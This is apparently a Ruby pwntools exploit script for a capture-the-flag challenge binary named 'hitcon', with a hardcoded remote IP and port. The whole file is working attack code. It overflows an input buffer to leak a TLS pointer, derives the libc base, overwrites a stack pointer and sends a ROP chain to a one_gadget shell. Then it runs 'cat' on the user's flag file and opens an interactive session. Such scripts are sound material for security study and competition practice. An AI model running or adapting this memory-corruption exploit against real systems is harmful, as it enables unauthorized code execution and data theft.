#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

@magic = one_gadget(file: '/lib/x86_64-linux-gnu/libc.so.6')[0] || fail

host, port = '13.115.73.78', 31733
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'hitcon'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = 'amd64'

@room = [2, 2, 2]
def schedule
  z.puts 3
  z.puts [
    2, 3, 5,
    6, 7, 9,
    4, 8, 1
  ].map.with_index { |v, i| "#{i+1} #{v}" }.join("\n")
end

schedule

# start!
z.puts 4

z.gets "Which room you'd like to go?\n"
z.puts @room[0]

z.gets "Which room you'd like to go?\n"
z.puts @room[1]
z.gets "Any questions?\n"
z.write 'A' * 91 + "\x81" + "\n"
# z.gets 'A' * 0x20
tls = ("\x00" + z.readn(5) + "\x00\x00").u64
log.dump tls.hex
libc = ELF.new('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = tls + 0x5b6900
log.dump libc.address.hex

# 0x81 - 0x90 == -0xf
z.write "B" * 0xf + p64(tls)[0, 6] # let tls back

z.gets "Which room you'd like to go?\n"
z.puts @room[2]

z.gets "Any questions?"
# debug!
stack = tls - 0x1002918
z.write 'A' * 91 + p64(stack + 0x90)[0, 6] + "\n"
z.gets 'name'
pop_rcx = 0x3eb0b
z.write flat(libc.address + pop_rcx, 0, libc.address + @magic)

z.gets 'OK'
z.puts 'ls -la; cat /home/`whoami`/flag'
# debug!
z.interact
